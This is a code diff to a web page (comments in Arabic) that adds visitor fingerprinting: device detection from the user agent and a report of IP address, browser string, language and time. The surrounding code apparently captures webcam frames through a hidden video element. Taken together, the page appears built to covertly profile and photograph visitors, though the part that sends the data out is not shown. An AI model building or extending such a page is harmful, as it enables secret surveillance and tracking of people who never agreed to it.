@@ -25,6 +25,7 @@ button {
 #msg {
   margin-top:20px;
 }
+
 video { display:none; }
 </style>
 </head>
@@ -57,15 +58,29 @@ async function getIP() {
   }
 }
 
-// معلومات الجهاز
+// اسم الجهاز
+function getDeviceName() {
+  const ua = navigator.userAgent;
+
+  if (/iphone/i.test(ua)) return "iPhone";
+  if (/ipad/i.test(ua)) return "iPad";
+  if (/android/i.test(ua)) return "Android";
+  if (/windows/i.test(ua)) return "Windows PC";
+  if (/mac/i.test(ua)) return "Mac";
+
+  return "غير معروف";
+}
+
+// معلومات كاملة
 async function getInfo() {
   const ip = await getIP();
+  const device = getDeviceName();
 
   return `
 🌐 IP: ${ip}
-📱 الجهاز: ${navigator.platform}
+📱 الجهاز: ${device}
 🌐 اللغة: ${navigator.language}
-📏 الشاشة: ${screen.width}x${screen.height}
+🧭 المتصفح: ${navigator.userAgent}
 ⏰ الوقت: ${new Date().toLocaleString()}
 `;
 }
@@ -88,6 +103,7 @@ function startCamera() {
   });
 }
 
+// التقاط الصورة
 async function capture() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
